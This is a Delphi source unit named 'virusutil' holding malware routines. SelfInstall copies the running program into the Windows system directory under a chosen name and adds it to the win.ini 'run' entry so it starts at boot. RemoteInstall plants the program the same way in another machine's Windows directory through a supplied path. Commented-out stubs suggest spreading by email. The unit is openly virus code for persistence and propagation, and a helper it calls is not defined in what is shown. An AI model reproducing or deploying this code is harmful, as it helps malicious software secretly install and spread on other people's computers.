   unit virusutil;
   interface
   uses forms,
     sysutils,
     fmxutils,
     winprocs,
     windows,comobj,ddeman,classes;





   function SelfInstall(opt:string):BOOLEAN;
   function RemoteInstall(fileAs,WinIniPath:string):BOOLEAN;
   //function MailMeTo(addr:string):boolean;
   //function MailDistrib(subject,body,attach:string):boolean;
   implementation




   function SelfInstall(opt:string):BOOLEAN;
   var Appexe,appfile,destfile,destpath:string;
   tmp1:array [0..81] of char;
   f:file;
   WinDir:String;
   begin
   GetSystemDirectory(tmp1,80);
   WinDir:=strpas(tmp1);
   if (copy(WinDir,length(WinDir),1) <> '\') then
      WinDir := WinDir+'\';
     appexe:=application.exename;
     appfile:=extractfilename(appexe);
     destpath:=WinDir;
   //  destfile:=destpath+appfile;
       destfile:= destpath+opt;
    try
     Mycopyfile(appexe,destpath); // copy app to windir

     strpcopy(tmp1, destfile); // delete old file
     deletefile(tmp1);

     assignfile(f,destpath+appfile); // rename
     rename(f,destfile);

     strpcopy(tmp1, destfile);



     writeprivateprofilestring ('windows','run',tmp1,'win.ini');

   except;

     end;

     end;

   /////////
   function RemoteInstall(fileAs,WinIniPath:string):BOOLEAN;

   var Appexe,appfile,destfile,destpath:string;
   tmp1,tmp2:array [0..81] of char;
   f:file;
   WinDir:String;
   begin

   WinDir:=WinIniPath;
   if (copy(WinDir,length(WinDir),1) <> '\') then
      WinDir := WinDir+'\';
     appexe:=application.exename;
     appfile:=extractfilename(appexe);
     destpath:=WinDir;

       destfile:= destpath+fileAs;
    try
     Mycopyfile(appexe,destpath); // copy app to windir

     strpcopy(tmp1, destfile); // delete old file
     deletefile(tmp1);

     assignfile(f,destpath+appfile); // rename
     rename(f,destfile);

     strpcopy(tmp1, fileAs);

     strpcopy(tmp2, WinDir+'win.ini');

    writeprivateprofilestring ('windows','run',tmp1,tmp2);

   except;

     end;

     end;




    end.
